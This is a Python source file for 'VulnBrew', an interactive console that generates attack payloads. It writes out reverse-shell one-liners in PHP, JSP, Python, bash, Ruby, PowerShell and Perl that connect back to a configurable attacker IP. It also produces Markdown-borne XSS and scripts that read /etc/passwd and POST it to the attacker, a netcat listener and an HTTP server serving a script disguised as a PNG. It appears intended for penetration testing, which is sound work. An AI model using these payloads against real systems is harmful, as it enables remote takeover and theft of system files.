import os
import subprocess
import json
import os

SETTINGS_FILE = "settings.json" # file in same dir as main.py

def load_settings():
    """Load settings from the settings.json file."""
    if not os.path.exists(SETTINGS_FILE):
        save_settings({"attacker_ip": "127.0.0.1"})
    with open(SETTINGS_FILE, "r") as f:
        return json.load(f)

def save_settings(settings):
    """Save settings to the settings.json file."""
    with open(SETTINGS_FILE, "w") as f:
        json.dump(settings, f, indent=4)

# TO change the attacker IP in the settings.json file - makes it more repeatable for testing
def set_attacker_ip(ip=None):
    """Allow the user to set their attacker IP address via a parameter."""
    settings = load_settings()
    if not ip:
        print("[X] No IP address provided. Usage: setip <ip>")
        return

    settings["attacker_ip"] = ip
    save_settings(settings)
    print(f"[✔] Attacker IP updated to {ip}")



def display_logo():
    """Display the VulnBrew ASCII art logo and introductory message."""
    settings = load_settings()
    print(r"""
             (    (
              )   )
             (     )
             _______
          .-'       `-.
         /             \
        |   ~  VULN ~   |
        |   ~  BREW ~   |
         \             /
          `-._______.-'
            //     \\
    """)
    print("         V U L N  B R E W")
    print("\n")
    ip = settings["attacker_ip"]
    print(f"Attacker IP:    {ip}")
    print(f"Default Port:   (N/A)")

def get_payload(extension, ip, port, **kwargs):
    """Generate the appropriate payload based on file extension.
    
    Args:
        extension (str): The file extension for the payload.
        ip (str): The attacker's IP address.
        port (str): The port to be used for the reverse shell.
        kwargs: Additional parameters for specific payloads.

    Returns:
        str: The payload or a message indicating no payload is available for the extension.
    """
    # Predefined payloads based on file extension
    payloads = {
        ".php": (
            f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"');?>"
        ),
        ".jsp": (
            f"<% Runtime.getRuntime().exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); %>"
        ),
        ".py": (
            f"import socket,os,pty\ns=socket.socket()\ns.connect((\'{ip}\',{port}))\n"
            f"os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')"
        ),
        ".md": {
            "image_ssrf": (
                f"![exploit](http://{ip}:{port}/malicious.png)"
            ),
            "html_xss": (
                f"![alt text](x)\n<script>\nalert('XSS Exploit Triggered!');\n</script>"
            ),
            "code_injection": (
                f"```bash\n; curl http://{ip}:{port}/ -d \"$(cat /etc/passwd)\"\n```"
            ),
            "file_inclusion": (
                "![exploit](../../../../../etc/passwd)"
            ),
            "javascript_link": (
                "[Click Me](javascript:alert('Exploit Successful!'))"
            ),
            "path_traversal": (
                f"<script>\nfetch('/../../../../../etc/passwd')\n"
                f"  .then(response => response.text())\n"
                f"  .then(data => {{\n"
                f"    fetch('http://{ip}:{port}/', {{\n"
                f"      method: 'POST',\n"
                f"      body: JSON.stringify({{ fileContents: data }})\n"
                f"    }});\n"
                f"  }})\n"
                f"  .catch(error => console.error('Error fetching /etc/passwd:', error));\n</script>"
            ),
            "lfi": (
                f"<script>\n"
                f"const targetURL = \"{kwargs.get('target_url', '/file')}\";\n"
                f"const paramKey = \"{kwargs.get('param_key', 'path')}\";\n"
                f"fetch(`${{targetURL}}?${{paramKey}}=/etc/passwd`)\n"
                f"  .then(response => response.text())\n"
                f"  .then(data => {{\n"
                f"    fetch('http://{ip}:{port}/', {{\n"
                f"      method: 'POST',\n"
                f"      body: JSON.stringify({{ fileContents: data }})\n"
                f"    }});\n"
                f"  }})\n"
                f"  .catch(error => console.error('Error fetching file:', error));\n</script>"
            )
        },
        ".sh": (
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
        ),
        ".rb": (
            f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        ".ps1": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
        ),
        ".pl": (
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
        ),
    }
    return payloads.get(extension, f"# No payload available for {extension}")

def generate_payload(): # New functionality surrounding settings.json file has been done here
    """Interactively generate a payload."""
    settings = load_settings()
    ip = settings["attacker_ip"]
    print(f"[!] Using attacker IP: {ip}")

    port = input("[>] Enter the port for the reverse shell: ").strip()
    if not port.isdigit():
        print("[X] Port must be a valid number.")
        return

    print("[!] Supported file extensions: .php, .jsp, .py, .md, .sh")
    extension = input("[>] Enter the file extension: ").strip()
    if extension not in [".php", ".jsp", ".py", ".md", ".sh"]:
        print(f"[X] Unsupported file extension: {extension}")
        return

    if extension == ".md":
        # Provide specific options for Markdown exploits with descriptions
        md_exploit_types = {
            "image_ssrf": "(SSRF using an image link, requires a server to fetch the image)",
            "html_xss": "(Embedded XSS using HTML, requires a browser or vulnerable renderer)",
            "code_injection": "(Command injection via a code block, requires user execution)",
            "file_inclusion": "(Local file inclusion using path traversal)",
            "javascript_link": "(XSS through a JavaScript link, requires user interaction)",
            "path_traversal": "(Fetch /etc/passwd via path traversal, requires vulnerability)",
            "lfi": "(Fetch /etc/passwd via Local File Inclusion endpoint)"
        }
        print("[!] Available Markdown Exploits:")
        for i, (md_type, description) in enumerate(md_exploit_types.items(), 1):
            print(f"  {i}. {md_type} {description}")
        choice = input("[>] Select an exploit type: ").strip()
        try:
            md_exploit = list(md_exploit_types.keys())[int(choice) - 1]
        except (IndexError, ValueError):
            print("[X] Invalid selection. Aborting.")
            return

        # For LFI, ask for additional parameters
        kwargs = {}
        if md_exploit == "lfi":
            kwargs['target_url'] = input("[>] Enter the target URL endpoint (e.g., /file): ").strip()
            kwargs['param_key'] = input("[>] Enter the parameter key for file inclusion (e.g., path): ").strip()
    else:
        md_exploit = None
        kwargs = {}

    filename = input("[>] Enter the output filename (e.g., exploit): ").strip() + extension
    if os.path.exists(filename):
        overwrite = input(f"[!] File '{filename}' already exists. Overwrite? (y/n): ").strip().lower()
        if overwrite != "y":
            print("[X] Aborting payload generation.")
            return

    # Get the appropriate payload
    if extension == ".md":
        payload = get_payload(extension, ip, port, **kwargs).get(md_exploit, f"# No payload available for {md_exploit}")
    else:
        payload = get_payload(extension, ip, port)

    if "No payload" in payload:
        print(f"[X] {payload}")
        return

    # Display payload for review
    print("\n[!] Generated Payload:")
    print("=" * 50)
    print(payload)
    print("=" * 50)

    # Confirm and save the payload
    confirm = input("[>] Save this payload? (y/n): ").strip().lower()
    if confirm == "y":
        try:
            with open(filename, 'w') as f:
                f.write(payload)
            print(f"[✔] Payload saved to {filename}")
        except Exception as e:
            print(f"[X] Error saving payload: {e}")
    else:
        print("[X] Payload not saved.")

def setup_listener(port):
    """Set up a reverse shell listener."""
    print(f"[!] Starting reverse listener on port {port}...")
    os.system(f"nc -lvnp {port}")

def start_http_server(port):
    """Start an HTTP server to host payloads, optionally hosting malicious.png."""
    serve_malicious = input("[>] Do you want to host a malicious.png file? (y/n): ").strip().lower() == 'y'
    
    if serve_malicious:
        # Create the malicious.png file
        payload_content = """
<script>
  console.log("malicious.png payload fetched!");
  fetch('/etc/passwd')
    .then(response => {
      console.log("Fetch request successful:", response);
      return response.text();
    })
    .then(data => {
      console.log("Fetched data:", data);
      fetch('http://<your-ip>:<your-port>/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ fileContents: data })
      })
      .then(() => console.log("Data sent to attacker successfully"))
      .catch(error => console.error("Error sending data:", error));
    })
    .catch(error => console.error("Error fetching /etc/passwd:", error));
</script>
"""
        with open('malicious.png', 'w') as f:
            f.write(payload_content)
        print("[✔] Created malicious.png file.")

    # Start the HTTP server
    print(f"[!] Starting HTTP server on port {port}...")
    subprocess.run(["python3", "-m", "http.server", str(port)])


def console():
    """Interactive command console."""
    print("\nWelcome to VulnBrew Console! Type 'help' for a list of commands.\n")
    while True:
        command = input("VulnBrew> ").strip().lower()
        if command.startswith("setip"):
            try:
                ip = command.split()[1]
                set_attacker_ip(ip)
            except IndexError:
                print("[X] Usage: setip <ip>")
        elif command == "generate":
            generate_payload()
        elif command.startswith("listener"):
            try:
                port = command.split()[1]
                setup_listener(port)
            except IndexError:
                print("[X] Usage: listener <port>")
        elif command.startswith("http"):
            try:
                port = command.split()[1]
                start_http_server(port)
            except IndexError:
                print("[X] Usage: http <port>")
        elif command == "help":
            print("""
Available Commands:
  generate              - Generate a new payload
  setip     <ip>        - Set your attacker IP address
  listener  <port>      - Set up a reverse shell listener on the specified port
  http      <port>      - Start an HTTP server on the specified port
  exit                  - Exit the console
  help                  - Show this help message
            """)
        elif command == "exit":
            print("Exiting VulnBrew. Goodbye!")
            break
        else:
            print("[X] Unknown command. Type 'help' for a list of commands.")


if __name__ == "__main__":
    if not os.path.exists(SETTINGS_FILE):
        save_settings({"attacker_ip": "127.0.0.1"})
    display_logo()
    console()
